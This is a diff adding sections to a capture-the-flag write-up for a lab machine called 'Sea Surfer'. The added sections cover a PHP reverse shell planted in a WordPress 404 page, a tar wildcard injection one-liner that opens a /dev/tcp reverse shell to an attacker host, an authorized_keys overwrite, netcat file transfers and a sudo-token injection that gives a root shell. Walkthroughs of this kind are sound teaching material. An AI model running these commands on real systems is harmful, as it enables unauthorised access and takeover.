@@ -76,11 +76,11 @@ Checking the website, there's only a default template page. But looking at the h
 [...]
 ```
 
-We add this domain to our hosts file with `echo "10.18.72.160   seasurfer.thm" >> /etc/hosts`.
+We add this domain to our hosts file with `echo "10.10.56.149   seasurfer.thm" >> /etc/hosts`.
 
 ![](images/2.PNG)
 
-We click around the website. Check all the posts and info. It says it was made by "kyle", we'll keep that info for later. The comments also reveal a subdomain, which we also add to our hosts file with `echo "10.18.72.160   internal.seasurfer.thm" >> /etc/hosts`.
+We click around the website. Check all the posts and info. It says it was made by "kyle", we'll keep that info for later. The comments also reveal a subdomain, which we also add to our hosts file with `echo "10.10.56.149   internal.seasurfer.thm" >> /etc/hosts`.
 
 ![](images/3.PNG)
 
@@ -206,3 +206,95 @@ Note that can also just change kyle's password. WP uses a Portable PHP hash. Thi
 ![](images/11.PNG)
 
 We can change the hash in the database to "password", or `$P$BIaoue8/jCS/3qVUc3JVPSvXzvmdt.1`. Not necessary since we already cracked it.
+
+## Reverse Shell
+
+We log in to wordpress at /wp-admin with kyle's account.
+
+![](images/12.PNG)
+
+Create a simple reverse shell:
+```
+<?php
+
+exec("/bin/bash -c 'bash -i >& /dev/tcp/KALI_IP/1234 0>&1'");
+```
+
+We'll change to 404 page to this.
+
+We get a shell on our machine.
+
+## Wildcard Exploit
+
+Looking around, we find `/var/www/internal/maintenance/backup.sh`
+
+```
+www-data@seasurfer:/var/www/internal/maintenance$ cat backup.sh
+cat backup.sh
+#!/bin/bash
+
+# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
+# Still need to come up with a better backup system, perhaps a cloud provider?
+
+cd /var/www/internal/invoices
+tar -zcf /home/kyle/backups/invoices.tgz *
+```
+
+We can do a tar wildcard exploit.
+
+```bash
+cd /var/www/internal/invoices; echo "/bin/bash -c 'bash -i >& /dev/tcp/KALI_IP/9999 0>&1'" > shell.sh; echo "" > "--checkpoint-action=exec=sh shell.sh"; echo "" > --checkpoint=1; chmod 777 shell.sh
+```
+
+## Priv Esc
+
+Lets replace his key with our own key pair generated from `ssh-keygen`.
+
+```bash
+echo "ssh-rsa AAAAB3N[...]eEP+QL2S+SQq/QrP0= kali@kali" > ~/.ssh/authorized_keys
+```
+
+Send a file via `nc`.
+
+On remote: `nc -nvlp 1234 > LinPEAS.tar.gz`
+
+On local: `nc 10.10.245.211 1234 < LinPEAS.tar.gz`
+
+We see something interesting, ptrace protection is disabled. Looking at the linked article, we see that we may be able to exploit this if there was a sudo command run by this user <15 minutes ago, and if we can run gdb.
+
+```
+╔══════════╣ Checking sudo tokens
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens          
+ptrace protection is disabled (0)                                                               
+gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it
+```
+
+We see in the logs that there appears to be a sudo command that was used.
+
+```
+╔══════════╣ Searching passwords inside logs (limit 70)
+[...]
+Jun 14 23:46:46 seasurfer sudo:     kyle : TTY=pts/0 ; PWD=/home/kyle ; USER=root ; COMMAND=/root/admincheck
+    password: $6$hq600HkLbsAiSVHZ$/6GmaV6.y4iVS.OM9AI.O5OVQxq1y/C1A6AX4t9uFLyNzaIr/50cRFqLZCYsAwfQvrgQKdZPnOnyEbgzw7RhV/
+```
+
+The sudo command is likely executed when the machine starts. I restarted the machine and quickly went through the previous steps (this is why the wildcard exploit is a one liner). We can install gdb locally. We also send a copy of exploit_v2.sh (exploit.sh doesn't work for some reason) from https://github.com/nongiach/sudo_inject
+
+On remote:
+```bash
+nc -nvlp 6000 > gdb_9.1-0ubuntu1_amd64.deb; dpkg -x gdb_9.1-0ubuntu1_amd64.deb ~
+```
+
+On local:
+```bash
+nc 10.10.46.205 6000 < gdb_9.1-0ubuntu1_amd64.deb
+```
+
+Then the following commands will give us root access.
+```bash
+cd ~/usr/bin                                            #our directory with gdb
+export PATH=$(pwd):$PATH                                #add current (gdb) directory to path for current shell
+nc -nvlp 6000 > exploit_v2.sh; chmod 777 exploit_v2.sh  #copy exploit script and give perms
+sh exploit_v2.sh                                        #run exploit
+/tmp/sh -p                                              #gives us root shell
+```
